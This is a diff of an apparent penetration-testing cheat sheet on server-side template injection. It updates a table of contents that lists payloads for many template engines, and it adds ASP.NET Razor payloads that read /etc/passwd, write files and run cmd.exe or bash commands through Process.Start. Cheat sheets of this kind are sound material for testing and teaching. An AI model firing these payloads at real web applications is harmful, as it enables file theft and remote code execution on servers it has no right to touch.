@@ -4,18 +4,21 @@
 
 ## Summary
 
-- [Templates Injections](#templates-injections)
+- [Server Side Template Injection](#server-side-template-injection)
   - [Summary](#summary)
   - [Tools](#tools)
   - [Methodology](#methodology)
+  - [Detection](#detection)
   - [ASP.NET Razor](#aspnet-razor)
     - [ASP.NET Razor - Basic injection](#aspnet-razor---basic-injection)
+    - [ASP.NET Razor - Read/write files](#aspnet-razor---readwrite-files)
     - [ASP.NET Razor - Command execution](#aspnet-razor---command-execution)
   - [Expression Language EL](#expression-language-el)
     - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
+    - [Expression Language EL - Properties](#expression-language-el---properties)
     - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
     - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
-  - [Java - Freemarker](#freemarker)
+  - [Freemarker](#freemarker)
     - [Freemarker - Basic injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code execution](#freemarker---code-execution)
@@ -26,7 +29,7 @@
     - [Groovy - HTTP request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
-  - [JavaScript - Handlebars](#handlebars)
+  - [Handlebars](#handlebars)
     - [Handlebars - Command Execution](#handlebars---command-execution)
   - [Jade / Codepen](#jade--codepen)
   - [Java](#java)
@@ -34,7 +37,14 @@
     - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
   - [Django Templates](#django-templates)
-  - [Python - Jinja2](#jinja2)
+    - [Detection](#detection-1)
+    - [Django Templates for post-exploitation](#django-templates-for-post-exploitation)
+    - [Cross-site scripting](#cross-site-scripting)
+    - [Debug information leak](#debug-information-leak)
+    - [Leaking app’s Secret Key](#leaking-apps-secret-key)
+    - [Admin Site URL leak](#admin-site-url-leak)
+    - [Admin username and password hash leak](#admin-username-and-password-hash-leak)
+  - [Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
     - [Jinja2 - Template format](#jinja2---template-format)
     - [Jinja2 - Debug Statement](#jinja2---debug-statement)
@@ -43,25 +53,25 @@
     - [Jinja2 - Read remote file](#jinja2---read-remote-file)
     - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
     - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
-      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
+      - [Jinja2 - Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
       - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
       - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
       - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
       - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
     - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
-  - [Java - Jinjava](#jinjava)
+  - [Jinjava](#jinjava)
     - [Jinjava - Basic injection](#jinjava---basic-injection)
     - [Jinjava - Command execution](#jinjava---command-execution)
-  - [JavaScript - Lessjs](#lessjs)
+  - [Lessjs](#lessjs)
     - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
-    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
+    - [Lessjs \< v3 - Command Execution](#lessjs--v3---command-execution)
     - [Plugins](#plugins)
-  - [JavaScript - Lodash](#Lodash)
-    - [Lodash - Basic Injection](#Lodash---Basic-Injection)
-    - [Lodash - Command Execution](#Lodash---Command-Execution)
-  - [Python - Mako](#mako)
+  - [Lodash](#lodash)
+    - [Lodash - Basic Injection](#lodash---basic-injection)
+    - [Lodash - Command Execution](#lodash---command-execution)
+  - [Mako](#mako)
     - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
-  - [Java - Pebble](#pebble)
+  - [Pebble](#pebble)
     - [Pebble - Basic injection](#pebble---basic-injection)
     - [Pebble - Code execution](#pebble---code-execution)
   - [Ruby](#ruby)
@@ -69,17 +79,17 @@
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
     - [Ruby - List files and directories](#ruby---list-files-and-directories)
     - [Ruby - Code execution](#ruby---code-execution)
-  - [PHP - Smarty](#smarty)
-  - [PHP - Twig](#twig)
+  - [Smarty](#smarty)
+  - [Twig](#twig)
     - [Twig - Basic injection](#twig---basic-injection)
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
   - [Java - Velocity](#java---velocity)
   - [Java - Spring](#java---spring)
-  - [PHP - patTemplate](#pattemplate)
-  - [PHP - PHPlib](#phplib-and-html_template_phplib)
-  - [PHP - Plates](#plates)
+  - [patTemplate](#pattemplate)
+  - [PHPlib and HTML\_Template\_PHPLIB](#phplib-and-html_template_phplib)
+  - [Plates](#plates)
   - [References](#references)
 
 ## Tools
@@ -125,17 +135,43 @@ ${{<%[%'"}}%\.
 > Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.
 
 ### ASP.NET Razor - Basic injection
+```csharp
+@(1+2);
 
-```powershell
-@(1+2)
+// Current working directory
+@System.IO.Directory.GetCurrentDirectory();
+```
+
+### ASP.NET Razor - Read/write files
+```csharp
+@System.IO.File.ReadAllText("C:/Windows/System32/drivers/etc/hosts");
+@System.IO.File.ReadAllText("/etc/passwd");
+
+@System.IO.File.WriteAllText("C:/Windows/Temp/pwned", "PWNED");
+@System.IO.File.WriteAllText("/tmp/pwned", "PWNED");
 ```
 
 ### ASP.NET Razor - Command execution
-
 ```csharp
 @{
   // C# code
 }
+
+// Blind
+@System.Diagnostics.Process.Start("cmd.exe","/c whoami > %TEMP%/rce.txt");
+@System.Diagnostics.Process.Start("/bin/bash","-c \"id > /tmp/rce\"");
+
+// Output printed in template
+@System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{
+  FileName = "cmd.exe",
+  Arguments = "/c whoami",
+  RedirectStandardOutput = true
+}).StandardOutput.ReadToEnd();
+
+// Window oneliner
+@System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName="cmd.exe",Arguments="/c whoami",RedirectStandardOutput=true}).StandardOutput.ReadToEnd();
+// Linux oneliner
+@System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName="/bin/bash",Arguments="-c \"id\"",RedirectStandardOutput=true}).StandardOutput.ReadToEnd();
 ```
 
 ---
